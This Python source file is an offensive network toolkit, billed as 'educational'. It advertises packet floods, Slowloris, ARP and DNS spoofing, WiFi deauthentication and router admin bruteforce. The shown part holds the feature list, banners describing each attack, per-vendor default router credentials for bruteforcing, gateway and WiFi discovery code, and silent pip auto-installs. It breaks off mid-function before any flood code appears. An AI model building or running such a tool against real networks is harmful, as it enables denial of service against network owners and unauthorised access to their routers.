
#!/usr/bin/env python3
"""
 ╔══════════════════════════════════════════════════════════════════════╗
 ║     COMPREHENSIVE NETWORK SECURITY TESTER (Educational Only)        ║
 ║     Use ONLY on systems you own or have explicit permission         ║
 ║     Unauthorized use is illegal and unethical                       ║
 ╚══════════════════════════════════════════════════════════════════════╝

 Features:
   • HTTP/HTTPS Flood         – High‑concurrency HTTP request flood
   • SYN Flood                – Raw TCP SYN packet flood
   • UDP Flood                – High‑speed UDP datagram flood
   • ICMP Flood               – ICMP echo (ping) flood
   • Tor's Hammer / Slowloris  – Slow HTTP POST connection exhaustion
   • IPv4 Raw Network Attack  – Auto port‑detection + infinite raw packet barrage
   • Multi‑Vector Assault     – Combine multiple attack vectors simultaneously
   • Enhanced Port Scanner    – Multi‑threaded TCP connect + SYN stealth scan
   • Multi‑Proxy Support      – Tor, SOCKS5, HTTP proxies, proxy rotator
   • Proxy Chain / VPN Bot    – Route traffic through multiple anonymity layers
   • Router Disruption        – ARP spoofing, deauth, DHCP starvation, DNS poisoning
   • WiFi Attacks             – Deauthentication (Windows + Linux), beacon flood, WPA capture
   • Network Reconnaissance   – Network mapping, OS detection, service fingerprinting
   • MITM Framework           – ARP poisoning, DNS spoofing, session hijacking
   • Bandwidth Exhaustion     – Amplification attacks, reflection attacks
   • SSID‑Based Bruteforce    – Auto‑detect router by SSID, then bruteforce login
   • Windows WiFi Deauth      – netsh‑based deauth + Scapy/Npcap raw injection

 FULLY CROSS‑PLATFORM: Windows | Linux | macOS

 Requirements (for raw‑socket attacks): ROOT / Administrator privileges

 ALL ATTACKS NOW RUN INFINITE PACKETS BY DEFAULT (Ctrl+C to stop)
"""

import os
import sys
import time
import random
import string
import socket
import struct
import threading
import argparse
import textwrap
import itertools
import json
import subprocess
import platform
import ipaddress
import hashlib
import binascii
import select
import signal
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import deque, defaultdict

# ──────────────────────────────────────────────────────────────────────
#  PLATFORM DETECTION
# ──────────────────────────────────────────────────────────────────────
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX   = platform.system() == "Linux"
IS_MAC     = platform.system() == "Darwin"

# ──────────────────────────────────────────────────────────────────────
#  Windows console color support
# ──────────────────────────────────────────────────────────────────────
if IS_WINDOWS:
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass

# ──────────────────────────────────────────────────────────────────────
#  TRY TO IMPORT SOCKS (PySocks) — with helpful fallback
# ──────────────────────────────────────────────────────────────────────
SOCKS_AVAILABLE = False
socks_module = None

try:
    import socks as _socks
    SOCKS_AVAILABLE = True
    socks_module = _socks
except ImportError:
    try:
        import sockshandler as _socks
        SOCKS_AVAILABLE = True
        socks_module = _socks
    except ImportError:
        pass

if not SOCKS_AVAILABLE:
    print("[!] PySocks not found. Tor/SOCKS5 proxy support will be limited.")
    print("[!] Install it with:  pip install pysocks")
    print("[!] Attempting auto‑install via pip...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pysocks", "-q"],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        import socks as _socks
        SOCKS_AVAILABLE = True
        socks_module = _socks
        print("[OK] PySocks installed successfully!")
    except Exception:
        print("[!] Auto‑install failed. Run: pip install pysocks")

# Try to import scapy for advanced attacks
SCAPY_AVAILABLE = False
try:
    from scapy.all import (
        ARP, Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, Raw,
        send, sendp, sniff, sr1, srp, wrpcap, rdpcap,
        Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt, Dot11ProbeReq,
        Dot11ProbeResp, Dot11Auth, Dot11AssoReq, Dot11AssoResp,
        RadioTap, conf, get_if_hwaddr
    )
    SCAPY_AVAILABLE = True
except ImportError:
    print("[!] Scapy not found. Advanced WiFi/Router attacks will be limited.")
    print("[!] Install with: pip install scapy")

# Check if Npcap/WinPcap is available (for Windows raw WiFi)
NPCAP_AVAILABLE = False
if IS_WINDOWS and SCAPY_AVAILABLE:
    try:
        # Test if we can open a raw socket or if Npcap is installed
        result = subprocess.run(["sc", "query", "npcap"], capture_output=True, text=True)
        if "RUNNING" in result.stdout:
            NPCAP_AVAILABLE = True
        else:
            result2 = subprocess.run(["sc", "query", "npf"], capture_output=True, text=True)
            if "RUNNING" in result2.stdout:
                NPCAP_AVAILABLE = True
    except Exception:
        pass
    if NPCAP_AVAILABLE:
        print("[OK] Npcap/WinPcap detected — Windows raw WiFi injection available!")
    else:
        print("[!] Npcap not detected. WiFi deauth will use netsh fallback on Windows.")
        print("[!] Install Npcap from: https://npcap.com/ for raw WiFi injection.")

# Try netifaces for network interface info (Linux/macOS only)
NETIFACES_AVAILABLE = False
if not IS_WINDOWS:
    try:
        import netifaces
        NETIFACES_AVAILABLE = True
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "netifaces", "-q"],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            import netifaces
            NETIFACES_AVAILABLE = True
        except Exception:
            pass


# ──────────────────────────────────────────────────────────────────────
#  CONFIGURATION
# ──────────────────────────────────────────────────────────────────────
DEFAULT_PORTS = [20, 21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443,
                 445, 993, 995, 1433, 1521, 1723, 2082, 2083, 3000,
                 3306, 3389, 5000, 5432, 5900, 6379, 8000, 8080, 8443,
                 8888, 9000, 9090, 9200, 11211, 27017]

ROUTER_PORTS = [80, 443, 8080, 8443, 23, 22, 53, 67, 68, 1900, 5353, 5000]

MAX_WORKERS_DEFAULT = 300
SOCKET_TIMEOUT = 1.2
SLOWLORIS_SOCKET_TIMEOUT = 10
TOR_PROXY = "socks5h://127.0.0.1:9050"

# ── Global state ──────────────────────────────────────────────────────
stop_event = threading.Event()
packets_lock = threading.Lock()

packets_sent = 0
bytes_sent = 0
connections_active = 0
connections_lock = threading.Lock()
start_time = None

# Router disruption state
router_targets = {}
arp_cache = {}
router_disruption_active = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
]

# Common router default credentials for educational testing
ROUTER_CREDENTIALS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", ""), ("root", "root"), ("root", "admin"),
    ("admin", "password123"), ("admin", "admin123"), ("user", "user"),
    ("admin", "12345678"), ("admin", "123456789"), ("admin", "12345"),
    ("admin", "admin1234"), ("admin", "pass"), ("admin", "123456"),
    ("admin", "admin@123"), ("admin", "Admin@123"),
]

# Extended credentials organized by vendor
ROUTER_CREDENTIALS_BY_VENDOR = {
    "TP-Link":     [("admin", "admin"), ("admin", "1234"), ("admin", "password")],
    "Linksys":     [("admin", "admin"), ("admin", ""), ("admin", "password")],
    "Netgear":     [("admin", "password"), ("admin", "1234"), ("admin", "admin")],
    "D-Link":      [("admin", "admin"), ("admin", ""), ("admin", "password")],
    "Asus":        [("admin", "admin"), ("admin", "password"), ("admin", "1234")],
    "Cisco":       [("admin", "admin"), ("admin", "cisco"), ("cisco", "cisco")],
    "Ubiquiti":    [("ubnt", "ubnt"), ("admin", "admin"), ("root", "ubnt")],
    "Huawei":      [("admin", "admin"), ("admin", "Admin@123"), ("root", "admin")],
    "Xiaomi":      [("admin", "admin"), ("admin", "12345678")],
    "Tenda":       [("admin", "admin"), ("admin", "12345678")],
    "Belkin":      [("admin", "admin"), ("admin", ""), ("admin", "password")],
    "ZyXEL":       [("admin", "1234"), ("admin", "admin"), ("admin", "password")],
    "Technicolor": [("admin", "admin"), ("admin", "password")],
    "Arris":       [("admin", "password"), ("admin", "admin")],
    "Motorola":    [("admin", "motorola"), ("admin", "admin")],
    "MikroTik":    [("admin", ""), ("admin", "admin")],
}


# ──────────────────────────────────────────────────────────────────────
#  ATTACK EXPLANATIONS
# ──────────────────────────────────────────────────────────────────────

ATTACK_EXPLANATIONS = {
    "http_flood": """
    ╔══════════════════════ HTTP/HTTPS FLOOD ══════════════════════╗
    ║  WHAT:   Sends massive numbers of HTTP requests from many    ║
    ║          worker threads simultaneously. Each request uses    ║
    ║          random paths and User-Agents.                       ║
    ║  GOAL:   Exhaust the web server's connection pool.           ║
    ║  ROUTER IMPACT: Router admin panels have limited resources.  ║
    ║  BEST FOR: Web servers, router admin panels.                 ║
    ║  EFFICIENCY: 200-500 threads; with proxies for IP rotation.  ║
    ║  WORKS ON: ALL platforms (Windows, Linux, macOS)             ║
    ╚══════════════════════════════════════════════════════════════╝
    """,

    "syn_flood": """
    ╔═══════════════════════ SYN FLOOD ═══════════════════════════╗
    ║  WHAT:   Sends spoofed TCP SYN packets at high speed.       ║
    ║  GOAL:   Fill the target's SYN backlog queue.               ║
    ║  ⚠ REQUIRES ROOT + Linux (raw sockets)                      ║
    ╚══════════════════════════════════════════════════════════════╝
    """,

    "udp_flood": """
    ╔═══════════════════════ UDP FLOOD ═══════════════════════════╗
    ║  WHAT:   High‑speed UDP datagrams with random payload.      ║
    ║  GOAL:   Saturate bandwidth.                                ║
    ║  WORKS ON: ALL platforms                                    ║
    ╚══════════════════════════════════════════════════════════════╝
    """,

    "icmp_flood": """
    ╔═══════════════════════ ICMP FLOOD ══════════════════════════╗
    ║  WHAT:   ICMP Echo Request (ping) flood.                    ║
    ║  ⚠ REQUIRES ROOT + Linux/macOS (raw sockets)                ║
    ╚══════════════════════════════════════════════════════════════╝
    """,

    "tors_hammer": """
    ╔═══════════════════ TOR'S HAMMER / SLOWLORIS ════════════════╗
    ║  WHAT:   Opens many HTTP connections and sends partial       ║
    ║          headers extremely slowly. ADDITIVE mode.            ║
    ║  GOAL:   Exhaust the server's connection pool.              ║
    ║  WORKS ON: ALL platforms                                    ║
    ╚══════════════════════════════════════════════════════════════╝
    """,

    "multi_vector": """
    ╔══════════════════ MULTI‑VECTOR ASSAULT ═════════════════════╗
    ║  WHAT:   HTTP + UDP + Slowloris + ICMP simultaneously.      ║
    ║  WORKS ON: ALL platforms (ICMP skipped on Windows)          ║
    ╚══════════════════════════════════════════════════════════════╝
    """,

    "ipv4_raw": """
    ╔══════════════════ IPv4 RAW NETWORK ATTACK ══════════════════╗
    ║  WHAT:   Auto‑detects open ports then infinite raw barrage. ║
    ║  ⚠ REQUIRES ROOT + Linux (AF_PACKET)                        ║
    ╚══════════════════════════════════════════════════════════════╝
    """,

    "router_kill": """
    ╔══════════════════ ROUTER CONNECTION KILL ═══════════════════╗
    ║  WHAT:   NAT exhaustion + CPU saturation + bandwidth hog.   ║
    ║  WORKS ON: ALL platforms                                    ║
    ╚══════════════════════════════════════════════════════════════╝
    """,

    "wifi_deauth": """
    ╔═══════════════════ WiFi DEAUTHENTICATION ═══════════════════╗
    ║  WINDOWS: Uses netsh wlan disconnect (persistent disconnect) ║
    ║  LINUX:   Uses Scapy 802.11 deauth frames (monitor mode)    ║
    ║  WORKS ON: BOTH Windows AND Linux!                          ║
    ║                                                              ║
    ║  WINDOWS MODE: Repeatedly disconnects from target network.  ║
    ║  Effect: Clients cannot maintain stable connection.          ║
    ║                                                              ║
    ║  LINUX MODE: Sends forged 802.11 deauthentication frames.   ║
    ║  Requires monitor mode interface + root.                    ║
    ╚══════════════════════════════════════════════════════════════╝
    """,

    "wifi_beacon_flood": """
    ╔══════════════════ WiFi BEACON FLOOD ════════════════════════╗
    ║  WHAT:   Broadcasts thousands of fake WiFi beacon frames.   ║
    ║  ⚠ REQUIRES: Root + Scapy + monitor mode (Linux only)       ║
    ╚══════════════════════════════════════════════════════════════╝
    """,

    "ssid_bruteforce": """
    ╔══════════════════ SSID‑BASED ROUTER BRUTEFORCE ═════════════╗
    ║  WHAT:   Enter a WiFi SSID → auto‑detect router IP → brute   ║
    ║          force admin panel login.                            ║
    ║                                                              ║
    ║  HOW IT WORKS:                                              ║
    ║  1. You provide a WiFi network name (SSID)                   ║
    ║  2. Tool finds the router IP via:                            ║
    ║     • Windows: netsh wlan show interfaces → gateway          ║
    ║     • Linux:   nmcli/iwconfig → gateway                      ║
    ║     • Fallback: subnet scan for open ports 80/443            ║
    ║  3. Auto‑detects vendor from MAC OUI (TP-Link, Netgear, etc)║
    ║  4. Uses vendor‑specific default credentials first            ║
    ║  5. Then tries comprehensive credential list                  ║
    ║                                                              ║
    ║  WORKS ON: ALL platforms (Windows, Linux, macOS)             ║
    ╚══════════════════════════════════════════════════════════════╝
    """,

    "router_login_bruteforce": """
    ╔══════════════════ ROUTER LOGIN BRUTEFORCE ══════════════════╗
    ║  WHAT:   Direct IP-based router admin panel bruteforce.      ║
    ║  WORKS ON: ALL platforms                                    ║
    ╚══════════════════════════════════════════════════════════════╝
    """,
}


# ──────────────────────────────────────────────────────────────────────
#  UTILITY FUNCTIONS
# ──────────────────────────────────────────────────────────────────────

def banner():
    """Display the tool banner."""
    print(textwrap.dedent(r"""
    ╔══════════════════════════════════════════════════════════════════════╗
    ║   COMPREHENSIVE NETWORK SECURITY TESTER (Educational Purpose Only)  ║
    ║   Use ONLY on systems you own or have explicit permission           ║
    ║   ALL ATTACKS RUN INFINITE PACKETS — Ctrl+C to stop                 ║
    ║   Cross‑Platform: Windows | Linux | macOS                           ║
    ║                                                                      ║
    ║   ★ NEW: WiFi Deauth on WINDOWS (netsh‑based)                       ║
    ║   ★ NEW: SSID‑Based Router Bruteforce (auto‑detect + vendor)        ║
    ╚══════════════════════════════════════════════════════════════════════╝
    """))


def check_root():
    """Check if running with root/admin privileges (required for raw sockets)."""
    if IS_WINDOWS:
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    else:
        try:
            return os.geteuid() == 0
        except AttributeError:
            return False


def random_path():
    """Generate a random URI path."""
    length = random.randint(3, 16)
    chars = string.ascii_letters + string.digits + "-_"
    return "/" + "".join(random.choices(chars, k=length))


def random_ipv4():
    """Generate a random (possibly spoofed) IPv4 address."""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def random_mac():
    """Generate a random MAC address."""
    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))


def random_referer(host: str = ""):
    """Generate a random HTTP Referer header."""
    domains = ["google.com", "bing.com", "yahoo.com", "duckduckgo.com",
               "facebook.com", "twitter.com", "reddit.com", host]
    return f"https://{random.choice(domains)}/{random_path()}"


def increment_packets(count: int = 1, byte_count: int = 0):
    """Thread‑safe packet counter increment."""
    global packets_sent, bytes_sent
    with packets_lock:
        packets_sent += count
        bytes_sent += byte_count


def get_packets() -> int:
    """Thread‑safe packet counter read."""
    with packets_lock:
        return packets_sent


def get_bytes() -> int:
    """Thread‑safe byte counter read."""
    with packets_lock:
        return bytes_sent


def get_elapsed() -> float:
    """Get elapsed time since attack started."""
    global start_time
    if start_time is None:
        return 0.0
    return time.time() - start_time


def format_rate() -> str:
    """Return a formatted rate string."""
    elapsed = get_elapsed()
    if elapsed < 0.001:
        return "calculating..."
    pkts = get_packets()
    bts = get_bytes()
    pps = pkts / elapsed
    if bts > 0:
        mbps = (bts * 8) / (elapsed * 1_000_000)
        return f"{pkts} pkts | {pps:,.0f} pps | {mbps:.2f} Mbps"
    return f"{pkts} pkts | {pps:,.0f} pps"


def checksum(data: bytes) -> int:
    """Compute the 16‑bit one's complement checksum (RFC 1071)."""
    if len(data) % 2 == 1:
        data += b'\x00'
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return ~total & 0xFFFF


def stats_reporter(interval: float = 2.0):
    """Background thread that prints real‑time stats."""
    last_pkts = 0
    while not stop_event.is_set():
        time.sleep(interval)
        if stop_event.is_set():
            break
        current = get_packets()
        elapsed = get_elapsed()
        if elapsed > 0:
            instant_pps = (current - last_pkts) / interval
            avg_pps = current / elapsed
            print(f"    [Stats] Total: {current:>10,} pkts | "
                  f"Instant: {instant_pps:>8,.0f} pps | "
                  f"Avg: {avg_pps:>8,.0f} pps | "
                  f"Elapsed: {elapsed:>6.1f}s")
        last_pkts = current


def get_default_gateway():
    """Get the default gateway (router) IP address — cross-platform."""
    try:
        if IS_LINUX:
            with open("/proc/net/route") as f:
                for line in f:
                    fields = line.strip().split()
                    if fields[1] == "00000000" and fields[7] != "00000000":
                        gw = socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
                        return gw
        elif IS_MAC:
            result = subprocess.run(["netstat", "-rn"], capture_output=True, text=True)
            for line in result.stdout.split("\n"):
                if "default" in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        return parts[1]
        elif IS_WINDOWS:
            # Try netsh first (most reliable)
            try:
                result = subprocess.run(
                    ["netsh", "interface", "ip", "show", "addresses"],
                    capture_output=True, text=True
                )
                for line in result.stdout.split("\n"):
                    if "Default Gateway" in line:
                        parts = line.split(":")
                        if len(parts) >= 2:
                            gw = parts[-1].strip()
                            if gw and gw != "":
                                return gw
            except Exception:
                pass
            # Fallback: ipconfig
            result = subprocess.run(["ipconfig"], capture_output=True, text=True)
            for line in result.stdout.split("\n"):
                if "Default Gateway" in line:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        gw = parts[-1].strip()
                        if gw and gw != "":
                            return gw
            # Fallback: route print
            result2 = subprocess.run(["route", "print", "0.0.0.0"], capture_output=True, text=True)
            for line in result2.stdout.split("\n"):
                if "0.0.0.0" in line:
                    parts = line.split()
                    if len(parts) >= 4:
                        return parts[3]
    except Exception:
        pass

    # Fallback: try common router IPs
    for ip in ["192.168.1.1", "192.168.0.1", "10.0.0.1", "192.168.1.254", "192.168.0.254"]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip, 80)) == 0 or s.connect_ex((ip, 443)) == 0:
                s.close()
                return ip
            s.close()
        except Exception:
            pass
    return None


def get_local_ip():
    """Get the local IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def get_local_mac(interface: str = None):
    """Get local MAC address — cross-platform."""
    try:
        if not IS_WINDOWS and NETIFACES_AVAILABLE and interface:
            return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
        import uuid
        mac = uuid.getnode()
        return ':'.join([f'{(mac >> elements) & 0xff:02x}'
                         for elements in range(0, 2*6, 2)][::-1])
    except Exception:
        return None


def get_network_interfaces():
    """List available network interfaces — cross-platform."""
    interfaces = []
    try:
        if not IS_WINDOWS and NETIFACES_AVAILABLE:
            for iface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0]['addr']
                    mac = ""
                    if netifaces.AF_LINK in addrs:
                        mac = addrs[netifaces.AF_LINK][0].get('addr', '')
                    interfaces.append((iface, ip, mac))
        elif IS_WINDOWS:
            result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True)
            current_iface = ""
            current_ip = ""
            current_mac = ""
            for line in result.stdout.split("\n"):
                line = line.strip()
                if "adapter" in line.lower() and ":" in line:
                    if current_iface and current_ip:
                        interfaces.append((current_iface, current_ip, current_mac))
                    current_iface = line.split(":")[0].strip().replace("adapter ", "")
                    current_ip = ""
                    current_mac = ""
                elif "IPv4 Address" in line or "IP Address" in line:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        current_ip = parts[-1].strip().rstrip("(Preferred)").strip()
                elif "Physical Address" in line:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        current_mac = parts[-1].strip().replace("-", ":")
            if current_iface and current_ip:
                interfaces.append((current_iface, current_ip, current_mac))
        else:
            result = subprocess.run(["ip", "addr", "show"], capture_output=True, text=True)
            current_iface = ""
            for line in result.stdout.split("\n"):
                if line and not line.startswith(" "):
                    parts = line.split(":")
                    if len(parts) >= 2:
                        current_iface = parts[1].strip()
                elif "inet " in line:
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        ip = parts[1].split("/")[0]
                        interfaces.append((current_iface, ip, ""))
    except Exception:
        pass
    return interfaces


def get_oui_lookup(mac_prefix: str) -> str:
    """Look up manufacturer from MAC OUI prefix."""
    oui_db = {
        "00:1a:79": "Cisco", "00:1b:63": "Cisco", "00:1c:0f": "Cisco",
        "00:1e:4a": "Cisco", "00:1e:f7": "Cisco", "00:23:33": "Cisco",
        "00:25:84": "Cisco", "00:26:0b": "Cisco", "00:3a:7d": "Cisco",
        "00:0c:41": "Linksys", "00:12:17": "Linksys", "00:13:10": "Linksys",
        "00:18:39": "Linksys", "00:1d:7e": "Linksys", "00:1e:e5": "Linksys",
        "00:21:29": "Linksys", "00:22:6b": "Linksys", "00:25:9c": "Linksys",
        "00:14:6c": "Netgear", "00:18:4d": "Netgear", "00:1b:2f": "Netgear",
        "00:1e:2a": "Netgear", "00:22:3f": "Netgear", "00:24:b2": "Netgear",
        "00:26:f2": "Netgear", "00:30:ab": "Netgear", "00:0f:b5": "Netgear",
        "00:14:bf": "D-Link", "00:17:9a": "D-Link", "00:1b:11": "D-Link",
        "00:1c:f0": "D-Link", "00:1e:58": "D-Link", "00:21:91": "D-Link",
        "00:22:b0": "D-Link", "00:24:01": "D-Link", "00:26:5a": "D-Link",
        "00:14:22": "TP-Link", "00:19:e0": "TP-Link", "00:1d:0f": "TP-Link",
        "00:21:27": "TP-Link", "00:23:cd": "TP-Link", "00:25:86": "TP-Link",
        "00:27:19": "TP-Link", "f4:f2:6d": "TP-Link", "50:c7:bf": "TP-Link",
        "10:27:f5": "TP-Link", "18:a6:f7": "TP-Link", "e8:94:f6": "TP-Link",
        "ec:08:6b": "TP-Link", "b0:4e:26": "TP-Link", "c0:25:e9": "TP-Link",
        "00:14:a4": "Asus", "00:18:f3": "Asus", "00:1d:60": "Asus",
        "00:22:15": "Asus", "00:23:54": "Asus", "00:24:8c": "Asus",
        "00:26:18": "Asus", "08:60:6e": "Asus", "38:2c:4a": "Asus",
        "0c:9d:92": "Asus", "1c:b7:2c": "Asus", "2c:4d:54": "Asus",
        "00:03:93": "Apple", "00:0a:27": "Apple", "00:0d:93": "Apple",
        "00:14:51": "Apple", "00:17:f2": "Apple", "00:1b:63": "Apple",
        "00:1d:4f": "Apple", "00:1e:52": "Apple", "00:1f:5b": "Apple",
        "00:21:e9": "Apple", "00:22:41": "Apple", "00:23:12": "Apple",
        "00:23:df": "Apple", "00:24:36": "Apple", "00:25:00": "Apple",
        "00:25:bc": "Apple", "00:26:08": "Apple", "00:26:b0": "Apple",
        "04:0c:ce": "Apple", "08:66:98": "Apple",
        "00:15:5d": "Microsoft", "00:1d:d8": "Microsoft", "00:22:48": "Microsoft",
        "00:25:ae": "Microsoft", "00:0c:29": "VMware", "00:50:56": "VMware",
        "00:05:69": "VMware", "08:00:27": "VirtualBox", "00:16:3e": "Xen",
        "00:1a:1e": "Ubiquiti", "00:15:6d": "Ubiquiti", "00:27:22": "Ubiquiti",
        "04:18:d6": "Ubiquiti", "24:a4:3c": "Ubiquiti", "fc:ec:da": "Ubiquiti",
        "dc:9f:db": "Ubiquiti", "44:d9:e7": "Ubiquiti", "78:8a:20": "Ubiquiti",
        "b4:fb:e4": "Ubiquiti", "80:2a:a8": "Ubiquiti",
        "28:6e:d4": "Huawei", "00:18:82": "Huawei", "00:25:9e": "Huawei",
        "00:e0:fc": "Huawei", "08:19:a6": "Huawei", "24:db:ac": "Huawei",
        "34:29:12": "Xiaomi", "64:64:4b": "Xiaomi", "78:11:dc": "Xiaomi",
        "8c:be:be": "Xiaomi", "98:3b:16": "Xiaomi",
        "c8:3a:35": "Tenda", "00:b0:0c": "Tenda", "14:75:90": "Tenda",
        "50:2b:73": "Tenda", "b0:df:c1": "Tenda",
        "00:11:50": "Belkin", "00:17:3f": "Belkin", "00:22:75": "Belkin",
        "94:10:3e": "Belkin", "ec:1a:59": "Belkin",
        "00:13:49": "ZyXEL", "00:19:cb": "ZyXEL", "00:a0:c5": "ZyXEL",
        "04:bf:6d": "ZyXEL", "cc:5d:4e": "ZyXEL",
        "00:1d:19": "Technicolor", "00:1e:33": "Technicolor", "00:24:17": "Technicolor",
        "00:1e:46": "Arris", "00:1e:8c": "Arris", "14:c0:3e": "Arris",
        "00:0b:06": "Comtrend", "00:0b:6b": "Comtrend",
        "00:0c:42": "MikroTik", "00:15:6d": "MikroTik", "4c:5e:0c": "MikroTik",
        "6c:3b:6b": "MikroTik", "d4:ca:6d": "MikroTik",
        "00:1a:70": "ZTE", "00:1e:73": "ZTE", "00:23:3b": "ZTE",
        "14:cc:20": "TP-Link", "50:d4:f7": "TP-Link", "68:ff:7b": "TP-Link",
        "a0:f3:c1": "TP-Link", "ac:84:c6": "TP-Link", "d8:47:32": "TP-Link",
    }
    mac_prefix = mac_prefix.lower().replace("-", ":")[:8]
    for prefix, vendor in oui_db.items():
        if mac_prefix.startswith(prefix.lower()):
            return vendor
    return "Unknown"


# ──────────────────────────────────────────────────────────────────────
#  WiFi NETWORK DISCOVERY — CROSS‑PLATFORM
# ──────────────────────────────────────────────────────────────────────

def scan_wifi_networks():
    """
    Scan for nearby WiFi networks.
    Returns list of dicts with SSID, BSSID, Channel, Signal, etc.
    Works on both Windows and Linux.
    """
    networks = []

    if IS_WINDOWS:
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "networks", "mode=bssid"],
                capture_output=True, text=True
            )
            current_ssid = ""
            current_bssid = ""
            current_channel = ""
            current_signal = ""
            current_auth = ""
            current_radio = ""

            for line in result.stdout.split("\n"):
                line = line.strip()
                if line.startswith("SSID") and ":" in line:
                    # Save previous
                    if current_ssid and current_bssid:
                        networks.append({
                            "ssid": current_ssid,
                            "bssid": current_bssid,
                            "channel": current_channel,
                            "signal": current_signal,
                            "auth": current_auth,
                            "radio": current_radio,
                        })
                    parts = line.split(":", 1)
                    ssid = parts[1].strip() if len(parts) > 1 else ""
                    if ssid:
                        current_ssid = ssid
                        current_bssid = ""
                        current_channel = ""
                        current_signal = ""
                        current_auth = ""
                        current_radio = ""
                elif "BSSID" in line and ":" in line:
                    parts = line.split(":", 1)
                    current_bssid = parts[1].strip() if len(parts) > 1 else ""
                elif "Channel" in line and ":" in line:
                    parts = line.split(":", 1)
                    current_channel = parts[1].strip() if len(parts) > 1 else ""
                elif "Signal" in line and ":" in line:
                    parts = line.split(":", 1)
                    current_signal = parts[1].strip() if len(parts) > 1 else ""
                elif "Authentication" in line and ":" in line:
                    parts = line.split(":", 1)
                    current_auth = parts[1].strip() if len(parts) > 1 else ""
                elif "Radio type" in line and ":" in line:
                    parts = line.split(":", 1)
                    current_radio = parts[1].strip() if len(parts) > 1 else ""

            if current_ssid and current_bssid:
                networks.append({
                    "ssid": current_ssid,
                    "bssid": current_bssid,
                    "channel": current_channel,
                    "signal": current_signal,
                    "auth": current_auth,
                    "radio": current_radio,
                })
        except Exception as e:
            print(f"[!] WiFi scan error: {e}")

    else:
        # Linux: try nmcli first, then iwlist
        try:
            result = subprocess.run(
                ["nmcli", "-t", "-f", "SSID,BSSID,CHAN,SIGNAL,SECURITY",
                 "dev", "wifi", "list"],
                capture_output=True, text=True
            )
            for line in result.stdout.split("\n"):
                if ":" in line:
                    parts = line.split(":")
                    if len(parts) >= 4:
                        networks.append({
                            "ssid": parts[0] if parts[0] else "(hidden)",
                            "bssid": parts[1] if len(parts) > 1 else "",
                            "channel": parts[2] if len(parts) > 2 else "",
                            "signal": parts[3] if len(parts) > 3 else "",
                            "auth": parts[4] if len(parts) > 4 else "",
                            "radio": "",
                        })
        except Exception:
            pass

        if not networks:
            # Fallback: iwlist
            try:
                # Find wireless interface
                result = subprocess.run(["iwconfig"], capture_output=True, text=True)
                iface = ""
                for line in result.stdout.split("\n"):
                    if "IEEE 802.11" in line:
                        iface = line.split()[0]
                        break
                if iface:
                    result = subprocess.run(
                        ["sudo", "iwlist", iface, "scan"],
                        capture_output=True, text=True
                    )
                    current_ssid = ""
                    current_bssid = ""
                    current_channel = ""
                    current_signal = ""
                    for line in result.stdout.split("\n"):
                        line = line.strip()
                        if "ESSID:" in line:
                            current_ssid = line.split("ESSID:")[1].strip().strip('"')
                        elif "Address:" in line:
                            current_bssid = line.split("Address:")[1].strip()
                        elif "Channel:" in line:
                            current_channel = line.split("Channel:")[1].strip()
                        elif "Signal level:" in line:
                            current_signal = line.split("Signal level:")[1].strip()
                            if current_ssid:
                                networks.append({
